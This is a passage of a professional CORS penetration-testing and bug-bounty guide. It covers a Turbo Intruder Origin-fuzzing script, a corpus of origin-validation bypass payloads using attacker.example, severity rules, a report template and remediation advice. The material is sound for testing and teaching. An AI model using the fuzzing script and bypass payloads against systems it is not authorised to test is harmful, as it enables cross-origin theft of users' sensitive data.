+Identify API requests involving:
+
+  GET
+  POST
+  PUT
+  PATCH
+  DELETE
+  OPTIONS
+
+Prioritize authenticated and sensitive endpoints.
+
+38.2 Send Requests to Repeater
+
+For each selected endpoint:
+1. Send the original request to Repeater.
+2. Record baseline headers and response.
+3. Add an untrusted Origin header.
+4. Compare the response.
+5. Test Origin: null.
+6. Test trusted and unrelated origins.
+7. Test preflight separately.
+8. Compare authentication states.
+9. Compare redirects and error responses.
+10. Record every relevant difference.
+
+38.3 Repeater Checklist
+
+  - Baseline
+  - Origin: https://attacker.example
+  - Origin: null
+  - Origin: https://trusted.example
+  - Origin: https://attacker.example.trusted.example
+  - Origin: https://trusted.example.attacker.example
+  - Origin: http://trusted.example
+  - Origin: https://trusted.example:444
+  - Origin: https://trusted.example.
+  - Origin: https://trusted.example@attacker.example
+  - Origin: (duplicate header)
+  - OPTIONS with Access-Control-Request-Method: PUT
+
+38.4 Automating with Turbo Intruder
+
+  def queueRequests(target, wordlists):
+      engine = RequestEngine(endpoint=target.endpoint,
+                             concurrentConnections=5,
+                             requestsPerConnection=100,
+                             pipeline=False)
+      for origin in wordlists["cors-origins.txt"]:
+          req = target.req.replace("§ORIGIN§", origin)
+          engine.queue(req)
+
+  def handleResponse(req, interesting):
+      if "access-control-allow-origin: " + req.words["origin"] in req.response.lower():
+          table.add(req)
+
+================================================================================
+PART VII — ANALYSIS & REPORTING
+================================================================================
+
+================================================================================
+39. ORIGIN PARSER PAYLOAD CORPUS
+================================================================================
+
+The following values are useful for probing server-side validation logic.
+
+39.1 Case and Trailing Dot
+
+  https://TRUSTED.example
+  https://Trusted.Example
+  https://trusted.example.
+  https://trusted.example..  
+  https://TRUSTED.EXAMPLE.
+
+39.2 Default / Alternate Ports
+
+  https://trusted.example:443
+  https://trusted.example:444
+  https://trusted.example:0443
+  https://trusted.example:99999
+  https://trusted.example:0
+
+39.3 Prefix / Suffix Confusion
+
+  https://trusted.example.attacker.example
+  https://attacker.example.trusted.example
+  https://trusted-example.attacker.example
+  https://attacker.example/trusted.example
+  https://trusted.example%2eattacker.example
+  https://trusted.example%00.attacker.example
+
+39.4 User-Info / URL Parsing
+
+  https://trusted.example@attacker.example
+  https://trusted.example:pass@attacker.example
+  https://trusted.example#@attacker.example
+  https://attacker.example\@trusted.example
+  https://trusted.example\.attacker.example
+
+39.5 Backslash and Percent-Encoding
+
+  https:\\\\trusted.example
+  https://trusted.example%2f@attacker.example
+  https://trusted.example%2eattacker.example
+  https://trusted.example%252eattacker.example
+  https://tr%75sted.example
+
+39.6 IPv4 / IPv6 Edge Cases
+
+  https://[::1]
+  https://[::ffff:127.0.0.1]
+  https://[0:0:0:0:0:0:0:1]
+  https://[::]
+  https://0x7f000001
+  https://2130706433
+  https://127.1
+  https://0177.0.0.1
+  https://127.0.0.1
+
+39.7 IDN / Homograph
+
+  Unicode Cyrillic "а" (U+0430) vs Latin "a"
+  Punycode: https://xn--80ak6aa92e.example
+  https://trusted.exаmple (with Cyrillic а)
+
+39.8 Special Schemes
+
+  http://trusted.example
+  file://
+  chrome-extension://<extension-id>
+  moz-extension://<extension-id>
+  https://trusted.example:
+
+39.9 Whitespace / Control Characters
+
+  " https://trusted.example"
+  "https://trusted.example "
+  "https://trusted.example\r\n"
+  "https://trusted.example\t"
+
+39.10 Duplicate Origin
+
+  Origin: https://trusted.example
+  Origin: https://attacker.example
+
+(Sent as two headers.)
+
+39.11 Validation Rules
+
+- Many of these cannot be sent by a browser.
+- Use them for server-side parser differential discovery.
+- Then find a browser-realistic payload that reaches the same unsafe decision.
+- Only then can you report as a CORS vulnerability.
+
+================================================================================
+40. REAL-WORLD CASE STUDIES AND CVEs
+================================================================================
+
+40.1 Background
+
+Real-world cases teach pattern recognition. Below are representative examples
+from public bug bounty write-ups and CVEs. Names are illustrative or are public
+disclosures.
+
+40.2 Common Patterns Observed
+
+Pattern A — Wildcard reflect + credentials
+A financial services API reflected Origin and set ACAC=true. An attacker page
+read /api/me and exfiltrated session identifiers. Reported as High.
+
+Pattern B — Null origin on internal tool
+A company's internal tool accepted Origin: null with ACAC=true. A sandboxed
+iframe on a public marketing site read /api/admin/user-list. Reported as High
+under bug bounty.
+
+Pattern C — Subdomain trust + dangling CNAME
+A SaaS accepted any *.customer.example subdomain. One subdomain was abandoned
+and takeover-able. The CORS policy became exploitable. Reported as Critical due
+to account isolation impact.
+
+Pattern D — CDN cache poisoning via missing Vary
+An API set ACAO dynamically based on Origin, but omitted Vary: Origin and used
+a CDN. Responses for one origin were cached and returned to another. Reported as
+High.
+
+Pattern E — GraphQL endpoint with weak preflight
+A GraphQL endpoint accepted any Origin with credentials and allowed POST
+application/json. Introspection was accessible; user-data queries were
+readable. Reported as High.
+
+Pattern F — JSONP legacy endpoint
+A legacy /api/data?callback= endpoint returned sensitive data without any
+authorization check. CORS was irrelevant because <script> tags bypass SOP.
+Reported as Medium.
+
+Pattern G — DNS rebinding on internal admin
+An internal admin panel on 10.0.0.0/8 relied on IP allowlisting. DNS rebinding
+allowed a public attacker page to reach it. Reported as High after browser
+validation.
+
+40.3 Public CVEs / Writeups Worth Studying
+
+- Various Facebook / Meta CORS writeups (e.g., on bug bounty blogs)
+- Uber CORS bug bounty reports (public)
+- Shopify CORS-related disclosures (public)
+- PortSwigger Web Security Academy CORS labs
+- HackerOne public reports tagged "cors"
+
+These are study references only. Verify current details via authoritative
+sources before citing.
+
+40.4 Applying Case Studies
+
+For each case, ask:
+- What was the root cause?
+- What was the browser-level demonstration?
+- What false-positive eliminations were applied?
+- What severity was assigned and why?
+- What remediation worked?
+
+================================================================================
+41. FALSE-POSITIVE ELIMINATION
+================================================================================
+
+This section is critical.
+
+41.1 Origin Reflection Alone
+
+Observation:
+
+  Access-Control-Allow-Origin: https://attacker.example
+
+This is suspicious, but not sufficient. Validate credentials, sensitive response
+data, and browser readability.
+
+41.2 ACAC Alone
+
+Observation:
+
+  Access-Control-Allow-Credentials: true
+
+This does not prove that an untrusted origin is allowed.
+
+41.3 Wildcard Alone
+
+Observation:
+
+  Access-Control-Allow-Origin: *
+
+This does not permit credentialed browser response sharing. Determine whether
+sensitive unauthenticated data is exposed.
+
+41.4 Permissive OPTIONS Alone
+
+An OPTIONS response that allows multiple methods does not prove the actual
+request can read sensitive data.
+
+41.5 curl Success
+
+curl does not enforce browser CORS. A successful curl response is not proof that
+JavaScript can read it.
+
+41.6 Authorization Header Assumption
+
+Do not assume a malicious website automatically has the victim's bearer token.
+Demonstrate the actual token-exposure or credential-delivery path.
+
+41.7 Cookie Restrictions
+
+A permissive CORS response may still fail to expose authenticated data because
+cookies were not sent. Check SameSite, Secure, third-party cookie restrictions,
+browser privacy settings, and fetch credential mode.
+
+41.8 Public Data
+
+If an endpoint exposes only public information, assess whether that exposure
+violates an actual security boundary. Do not exaggerate the impact.
+
+41.9 Missing Vary
+
+Missing Vary: Origin alone is not sufficient. Demonstrate cache contamination or
+cross-origin response exposure.
+
+41.10 Malformed Origin Values
+
+A server accepting malformed values does not prove a browser can send those
+values. Find a browser-realistic exploit path.
+
+41.11 Duplicate Headers
+
+Duplicate CORS headers can produce inconsistent behavior, but browser acceptance
+must be verified.
+
+41.12 WebSocket, PNA, CORP, COEP, COOP, JSONP
+
+These are related or adjacent security areas. Do not automatically classify their
+weaknesses as CORS.
+
+41.13 DNS Rebinding
+
+DNS rebinding is not a CORS misconfiguration. Report under browser security
+boundary bypass, but note the interaction with any CORS policy present.
+
+41.14 XS-Leaks
+
+XS-Leaks are a separate category. Do not classify as CORS unless CORS is
+necessary for the leak.
+
+================================================================================
+42. EXPLOITABILITY VALIDATION DECISION TREE
+================================================================================
+
+  START
+    |
+    v
+  Does the endpoint return CORS headers?
+    |
+    +-- NO --> No CORS exposure observed (consider XS-Leaks / DNS rebinding)
+    |
+    +-- YES
+          |
+          v
+  Does an untrusted origin receive a permissive ACAO?
+          |
+          +-- NO --> Review other origin and endpoint variants
+          |
+          +-- YES
+                |
+                v
+  Is the endpoint sensitive?
+                |
+                +-- NO --> Usually informational or low impact
+                |
+                +-- YES
+                      |
+                      v
+  Does the endpoint require authentication?
+                      |
+                      +-- NO --> Test unauthorized browser readability
+                      |
+                      +-- YES
+                            |
+                            v
+  Can the browser send eligible credentials?
+                            |
+                            +-- NO --> Credentialed attack path not established
+                            |
+                            +-- YES
+                                  |
+                                  v
+  Can JavaScript read the actual response?
+                                  |
+                                  +-- NO --> Not a confirmed CORS data-exposure
+                                  |          (check XS-Leaks)
+                                  |
+                                  +-- YES
+                                        |
+                                        v
+  Does the response expose meaningful sensitive data?
+                                        |
+                                        +-- NO --> Impact not established
+                                        |
+                                        +-- YES
+                                              |
+                                              v
+                                    CONFIRMED CORS EXPOSURE
+                                        |
+                                        v
+                              Determine browser matrix, severity
+                              and whether chaining is needed.
+
+================================================================================
+43. IMPACT AND SEVERITY ASSESSMENT
+================================================================================
+
+Severity depends on the sensitivity of exposed information, authentication
+requirements, attacker prerequisites, and realistic exploitability.
+
+43.1 Informational
+
+Examples:
+- CORS headers are present.
+- A wildcard policy exists on a genuinely public resource.
+- An origin is reflected but no sensitive data is exposed.
+- A permissive preflight response has no demonstrated impact.
+
+43.2 Low
+
+Examples:
+- Limited non-sensitive information is readable from an untrusted origin.
+- An unintended cross-origin policy exists but has restricted practical impact.
+
+43.3 Medium
+
+Examples:
+- Authenticated account metadata is readable from an attacker-controlled origin.
+- Sensitive but limited user information is exposed.
+- An exploitable CORS policy affects a meaningful authenticated workflow.
+
+43.4 High
+
+Examples:
+- Sensitive account information is readable through a realistic credentialed
+  cross-origin attack.
+- Confidential organization or business data can be extracted.
+- A demonstrated CORS weakness creates a substantial account-security impact.
+
+43.5 Critical
+
+Reserve for exceptional cases with demonstrated severe consequences, such as a
+reliable cross-origin account-compromise chain affecting highly privileged
+accounts or highly sensitive systems.
+
+Do not assign severity solely from the presence of
+Access-Control-Allow-Credentials: true.
+
+43.6 Additional Severity Modifiers
+
+- Subdomain takeover chaining: +1 level.
+- DNS rebinding reachability: +1 if internal admin.
+- XS-Leak chaining enables broader enumeration: +1 if it materially expands impact.
+- Wildcard ACAO on unauthenticated PII: Medium at minimum.
+- Exposed sensitive token with live session: High.
+- Browser-specific exploitability: report the specific browsers; do not inflate
+  severity because it works in one browser.
+
+================================================================================
+44. PROFESSIONAL BUG BOUNTY REPORT TEMPLATE
+================================================================================
+
+44.1 Title
+
+  CORS Misconfiguration Allows Untrusted Origins to Read Sensitive Authenticated
+  API Responses
+
+44.2 Summary
+
+The application incorrectly permits an untrusted origin to access a sensitive API
+response through browser-based cross-origin requests.
+
+The endpoint returns permissive CORS headers for an origin that should not be
+trusted. Under the demonstrated browser and authentication conditions, JavaScript
+hosted on the untrusted origin can read sensitive response data.
+
+44.3 Affected Endpoint
+
+  https://api.example.com/api/profile
+
+44.4 Affected Origin
+
+  https://attacker.example
+
+44.5 Vulnerability Type
+
+  CORS Misconfiguration
+
+44.6 Steps to Reproduce
+
+1. Log in to the application using the provided test account.
+2. Open the controlled PoC hosted on the untrusted origin.
+3. Allow the PoC to send a credentialed request to the affected API endpoint.
+4. Observe the browser request and response.
+5. Verify that the browser accepts the CORS response.
+6. Observe that JavaScript can read the response body.
+7. Confirm the sensitive information exposed using test-account data.
+
+44.7 Request
+
+  GET /api/profile HTTP/1.1
+  Host: api.example.com
+  Origin: https://attacker.example
+
+44.8 Vulnerable Response
+
+  HTTP/1.1 200 OK
+  Access-Control-Allow-Origin: https://attacker.example
+  Access-Control-Allow-Credentials: true
+  Content-Type: application/json
+
+44.9 Browser Validation
+
+  Browser:
+  Browser version:
+  Test origin:
+  Target endpoint:
+  Authentication state:
+  Cookie behavior:
+  JavaScript response readable:
+  Sensitive information exposed:
+
+44.10 Security Impact
+
+Explain exactly what an attacker can access and under what conditions.
+
+Avoid generic statements such as "an attacker can steal all user data" unless
+that impact has been demonstrated.
+
+44.11 Evidence
+
+Attach:
+- Original request
+- Response headers
+- Response body with test data
+- Browser developer tools evidence
+- Controlled PoC
+- Authentication-state details
+- Relevant screenshots
+- Playwright script + output (where applicable)
+
+Do not include real users' secrets or personal information.
+
+44.12 Suggested Remediation
+
+- Validate Origin against a strict allowlist.
+- Avoid reflecting arbitrary Origin values.
+- Do not trust every subdomain by default.
+- Avoid trusting null unless there is a specific, justified requirement.
+- Use exact scheme, hostname, and port comparisons.
+- Enable credentials only for explicitly trusted origins.
+- Avoid wildcard ACAO for sensitive resources.
+- Use appropriate Vary: Origin behavior for dynamic origin responses.
+- Keep authorization checks independent of CORS.
+- Review CORS policy across CDN, proxy, gateway, and backend layers.
+
+================================================================================
+45. REMEDIATION AND SECURE CONFIGURATION
+================================================================================
+
+45.1 Use an Explicit Allowlist
+
+  const allowedOrigins = new Set([
+    "https://app.example.com",
+    "https://admin.example.com"
+  ]);
+
+  function isAllowedOrigin(origin) {
+    return allowedOrigins.has(origin);
+  }
+
+This is an illustrative policy check. Production implementations should use the
+framework's trusted URL/origin parsing facilities and validate exact normalized
+origins.
+
+45.2 Do Not Reflect Arbitrary Origins
+
+Avoid:
+
+  res.setHeader("Access-Control-Allow-Origin", req.headers.origin);
+
+unless the supplied origin has first passed strict validation.
+
+45.3 Use Exact Origin Matching
+
+Validate:
+- Scheme
+- Hostname
+- Port
+
+Do not use an unchecked substring, prefix, or suffix comparison.
+
+45.4 Minimize Credentialed CORS
+
+Only enable:
+
+  Access-Control-Allow-Credentials: true
+
+when required. Do not permit credentials for every origin.
+
+45.5 Minimize Methods and Headers
+
+Allow only the methods and request headers required by the application.
+
+45.6 Protect Sensitive Endpoints Independently
+
+CORS must never replace:
+- Authentication
+- Authorization
+- Object-level access control
+- CSRF defenses
+- Session management
+- Rate limiting
+
+45.7 Configure Caches Correctly
+
+When ACAO varies by Origin, configure cache behavior to prevent one origin's
+response from being reused for another.
+
+Use:
+
+  Vary: Origin
+
+where appropriate, and configure CDN cache keys correctly.
+
+45.8 Apply Consistent Policies
+
+Review CORS configuration at:
+- CDN
+- WAF
+- Reverse proxy
+- API gateway
+- Backend application
+- Error handler
+- Authentication service
+
+Avoid inconsistent policies across different layers.
+
+45.9 Defense in Depth
+
+In addition to CORS:
+- Enforce same-site cookies (SameSite=Lax or Strict) where possible.
+- Use CSRF tokens for state-changing endpoints.
+- Validate Origin server-side even when CORS is correct.
+- Apply CORP where appropriate.
+- Deploy COEP require-corp on isolated apps.
+- Use COOP on sensitive apps to prevent opener access.
+- Add PNA preflight handling where internal resources are exposed.
+- Use Content Security Policy to restrict exfiltration.
+
+================================================================================
+PART VIII — CHECKLISTS & CONCLUSION
+================================================================================
+
+================================================================================
+46. MASTER TESTING CHECKLIST
+================================================================================
+
+46.1 Reconnaissance
+
+  [ ] Identify API hosts.
+  [ ] Identify sensitive endpoints.
+  [ ] Identify authentication requirements.
+  [ ] Identify API versions.
+  [ ] Identify redirects.
+  [ ] Identify CDN and gateway behavior.
+  [ ] Establish a baseline response.
+
+46.2 Basic Origin Testing
+
+  [ ] Trusted origin.
+  [ ] Untrusted origin.
+  [ ] Unrelated origin.
+  [ ] Null origin.
+  [ ] HTTP origin.
+  [ ] Alternate port.
+  [ ] Subdomain origin.
+  [ ] Prefix confusion.
+  [ ] Suffix confusion.
+  [ ] Case variation.
+  [ ] Trailing dot.
+  [ ] Default port.
+  [ ] Non-default port.
+  [ ] User-info syntax.
+  [ ] IPv6.
+  [ ] IDN/Punycode.
+
+46.3 Header Testing
+
+  [ ] ACAO.
+  [ ] ACAC.
+  [ ] Allow-Methods.
+  [ ] Allow-Headers.
+  [ ] Expose-Headers.
+  [ ] Max-Age.
+  [ ] Vary.
+  [ ] Duplicate headers.
+  [ ] Header normalization.
+  [ ] Timing-Allow-Origin.
+
+46.4 Request Testing
+
+  [ ] GET.
+  [ ] HEAD.
+  [ ] POST.
+  [ ] Form-urlencoded.
+  [ ] Multipart.
+  [ ] Text/plain.
+  [ ] JSON.
+  [ ] PUT.
+  [ ] PATCH.
+  [ ] DELETE.
+  [ ] OPTIONS.
+  [ ] Authorization header.
+  [ ] Custom headers.
+
+46.5 Browser Testing
+
+  [ ] Controlled attacker origin.
+  [ ] Real browser.
+  [ ] Test account.
+  [ ] Credential mode include.
+  [ ] Credential mode omit.
+  [ ] Cookie delivery confirmed.
+  [ ] Browser response accepted.
+  [ ] JavaScript can read response.
+  [ ] Sensitive data identified.
+  [ ] Browser/version recorded.
+
+46.6 Advanced Testing
+
+  [ ] Origin parser differential.
+  [ ] Redirect chains.
+  [ ] Preflight cache.
+  [ ] Policy transitions.
+  [ ] CDN inconsistency.
+  [ ] Reverse proxy inconsistency.
+  [ ] API gateway inconsistency.
+  [ ] Error-response CORS.
+  [ ] Authentication-state differences.
+  [ ] Account-role differences.
+  [ ] API version differences.
+  [ ] Alternate host differences.
+  [ ] Cache behavior.
+  [ ] Wildcard exposure.
+  [ ] PNA investigation, if relevant.
+  [ ] WebSocket Origin validation, if relevant.
+
+46.7 Ultimate Advanced (V4.0 New)
+
+  [ ] DNS rebinding reachability.
+  [ ] XS-Leak timing / error probing.
+  [ ] JSONP / XSSI exposure.
+  [ ] Service worker interception scope.
+  [ ] postMessage origin validation.
+  [ ] CORP / COEP / COOP interaction.
+  [ ] Cross-browser validation (Chrome, Firefox, Safari, Edge).
+  [ ] HTTP/2 duplicate header behavior.
+  [ ] Mobile / WebView / Electron behavior.
+  [ ] document.domain usage.
+  [ ] Expose-Headers sensitive data.
+  [ ] Timing-Allow-Origin data leak.
+
+46.8 Final Validation
+
+  [ ] Untrusted origin accepted.
+  [ ] Actual request succeeds.
+  [ ] Credentials behavior understood.
+  [ ] Browser accepts response.
+  [ ] JavaScript reads response.
+  [ ] Sensitive information is exposed.
+  [ ] Impact is reproducible.
+  [ ] False positives eliminated.
+  [ ] Evidence collected using test data.
+  [ ] Finding classified correctly.
+  [ ] Browser matrix documented.
+
+================================================================================
+47. FINAL DETECTION LOGIC
+================================================================================
+
+A strong CORS finding should establish the following chain:
+
+  UNTRUSTED ORIGIN
+         |
+         v
+  SERVER ACCEPTS THE ORIGIN
+         |
+         v
+  CORS RESPONSE PERMITS ACCESS
+         |
+         v
+  ACTUAL REQUEST IS SENT
+         |
+         v
+  REQUIRED CREDENTIALS ARE AVAILABLE
+         |
+         v
+  BROWSER ACCEPTS THE CORS RESPONSE
+         |
+         v
+  JAVASCRIPT READS THE RESPONSE
+         |
+         v
+  SENSITIVE INFORMATION IS EXPOSED
+         |
+         v
+  MEANINGFUL SECURITY IMPACT
+
+Not every finding requires credentials. A sensitive unauthenticated resource may
+be exposed through wildcard CORS. However, every report must accurately
+demonstrate the relevant access conditions and impact.
+
+================================================================================
+48. ADVANCED TESTING PRINCIPLES
+================================================================================
+
+Keep these rules in mind:
+
+ 1. CORS is a browser-enforced response-sharing mechanism.
+ 2. Origin reflection is not automatically exploitable.
+ 3. ACAC alone does not prove credentialed exposure.
+ 4. Wildcard ACAO does not enable credentialed response sharing.
+ 5. OPTIONS success does not prove actual-request success.
+ 6. curl and Burp Repeater do not enforce browser CORS.
+ 7. Browser JavaScript readability is essential evidence.
+ 8. Cookies may be restricted by SameSite and browser privacy controls.
+ 9. HttpOnly prevents cookie reading, not necessarily cookie transmission.
+10. Bearer tokens are not automatically available to attacker-controlled sites.
+11. Missing Vary is not automatically cache poisoning.
+12. A malformed Origin response is not automatically browser-exploitable.
+13. Redirect behavior must be validated in the target browser.
+14. Preflight caching must be tested rather than assumed vulnerable.
+15. CDN and backend header differences must be validated end to end.
+16. CORS does not replace authentication or authorization.
+17. CORS and CSRF are different security problems.
+18. IDOR, XSS, JWT exposure, and WebSocket Origin validation should be
+    classified accurately.
+19. PNA is an adjacent browser security area, not simply ordinary CORS.
+20. Never exaggerate impact beyond what the evidence demonstrates.
+21. DNS rebinding bypasses SOP without CORS; report it under the correct
+    category.
+22. XS-Leaks can extract information even where CORS blocks the body.
+23. JSONP and XSSI bypass CORS entirely; assess separately.
+24. Service workers change the CORS threat model on trusted origins.
+25. postMessage origin validation is a distinct but frequently co-exploited
+    weakness.
+26. CORP, COEP, and COOP can override an otherwise permissive CORS policy.
+27. Browser matrix matters — report which browsers are actually exploitable.
+28. Headless browsers (Playwright/Puppeteer) produce reproducible browser
+    evidence.
+29. Real-world case studies accelerate pattern recognition.
+30. A complete report includes request, response, browser validation, and
+    browser matrix.
+
+================================================================================
+49. REFERENCES AND FURTHER READING
+================================================================================
+
+Use authoritative documentation to verify browser behavior and implementation
+details.
+
+MDN — Cross-Origin Resource Sharing (CORS)
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS
+
+MDN — CORS Errors
+https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS/Errors
+
+MDN — Fetch API
+https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API
+
+MDN — Resource Timing API
+https://developer.mozilla.org/en-US/docs/Web/API/Performance_API
+
+MDN — Cross-Origin-Resource-Policy
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Resource-Policy
+
+MDN — Cross-Origin-Opener-Policy
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Opener-Policy
+
+MDN — Cross-Origin-Embedder-Policy
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Embedder-Policy
+
+OWASP — CORS Security Cheat Sheet
+https://cheatsheetseries.owasp.org/cheatsheets/Cross-Origin_Resource_Sharing_Cheat_Sheet.html
+
+OWASP — Web Security Testing Guide
+https://owasp.org/www-project-web-security-testing-guide/
+
+OWASP — XS-Leaks (Cross-Site Leaks)
+https://xsleaks.dev/
+
+PortSwigger — Cross-Origin Resource Sharing (CORS)
+https://portswigger.net/web-security/cors
+
+PortSwigger — CORS Additional Checks Extension
+https://portswigger.net/bappstore
+
+PortSwigger — Web Security Academy CORS Labs
+https://portswigger.net/web-security/cors
+
+Chrome Developers — Private Network Access
+https://developer.chrome.com/blog/private-network-access-preflight/
+
+Playwright Documentation
+https://playwright.dev/
+
+Puppeteer Documentation
+https://pptr.dev/
+
+Nuclei Templates (CORS)
+https://github.com/projectdiscovery/nuclei-templates
+
+corsy (GitHub)
+https://github.com/s0md3v/Corsy
+
+CORScanner (GitHub)
+https://github.com/chenjj/CORScanner
+
+================================================================================
+50. FINAL CONCLUSION
+================================================================================
+
+The most important part of advanced CORS testing is not finding a permissive
+header. It is proving that an untrusted browser origin can access information or
+functionality that should remain protected.
+
+A complete assessment should combine:
+
+- Origin validation testing
+- Header analysis
+- Preflight analysis
+- Authentication and cookie analysis
+- Browser-based validation
+- Sensitive endpoint identification
+- Infrastructure and cache differential testing
+- Advanced parser and redirect testing
+- DNS rebinding reachability
+- XS-Leaks and side channels
+- JSONP / XSSI legacy vectors
+- Service worker and postMessage interaction
+- CORP / COEP / COOP awareness
+- Browser differential reporting
+- Headless-browser automation
+- Accurate impact assessment
+
+The strongest evidence is a reproducible browser demonstration showing that a
+controlled untrusted origin can read a sensitive response under clearly
+documented conditions.
+
+This is the difference between identifying a suspicious CORS configuration and
+demonstrating a valid, actionable security vulnerability.
+
+================================================================================
+END OF DOCUMENT
+================================================================================
